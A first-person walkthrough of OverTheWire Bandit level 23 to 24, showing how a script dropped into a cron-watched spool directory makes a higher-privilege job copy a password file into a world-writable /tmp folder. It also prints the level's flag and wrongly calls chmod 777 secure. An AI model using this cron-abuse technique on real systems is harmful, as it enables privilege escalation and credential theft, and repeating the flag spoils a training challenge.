# Bandit Level 23 → Level 24

### 🎯 Objective
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around...

### 🔍 Information & Clues
• **Host:** bandit.labs.overthewire.org
• **Port:** 2220
• **Username:** bandit23
• **Commands to research:** cron, crontab, ls, cat, chmod, cp, mkdir

### 💡 Thought Process & Steps
1. **Connecting:**
I logged into the level using SSH:

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

2. **Enumeration:**
I checked the active cron jobs in the directory to find out what runs automatically:

```bash
ls -la /etc/cron.d
```

I saw cronjob_bandit24 and inspected its contents:

```bash
cat /etc/cron.d/cronjob_bandit24
```

This configuration showed that /usr/bin/cronjob_bandit24.sh runs every minute as the user bandit24. I read that script to see what it does:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

The script goes into /var/spool/bandit24, finds any files owned by bandit23, executes them, and then completely deletes them. Because OverTheWire modern instances utilize a strict folder lockdown, the valid directory for custom scripts inside the target pool is /var/spool/bandit24/foo/.

3. **Reading the Flag:**
Since I couldn't read the bandit24 password directly as bandit23, I created an automated script to have the cron job read it for me.
First, I created a temporary working directory and opened up permissions so bandit24 could write to it:

```bash
mkdir /tmp/my_bandit_script
chmod 777 /tmp/my_bandit_script
cd /tmp/my_bandit_script
```
Next, I wrote my exploit shell script (script.sh) to copy the password file into my open directory:

```bash
cat << 'EOF' > script.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/my_bandit_script/password.txt
EOF
```

I made the script fully executable so the cron job engine would run it:

```bash
chmod +x script.sh
```

Finally, I copied the script into the target spool sandbox area:

```bash
cp script.sh /var/spool/bandit24/foo/script.sh
```

I waited 60 seconds for the cron job loop to trigger, execute my file, and delete it. Once the script vanished from the spool folder, I read my newly generated output text file:

```bash
cat /tmp/my_bandit_script/password.txt
```

### 🔑 Key Features Learned
* Cron Infrastructure: Learned how to locate system crontabs and break down automated shell loops.
* Privilege Escalation via Scripts: Exploited an automated tool running under a higher privilege profile to read restricted information on my behalf.
* Linux Permissions Isolation: Utilized broad folder access permissions (chmod 777) to let distinct sandbox system accounts interact securely across user environments.

### 🏁 Password/Flag
`💾 PK8fYLZg2hnHSz83plBL1iEPKdD3QToB`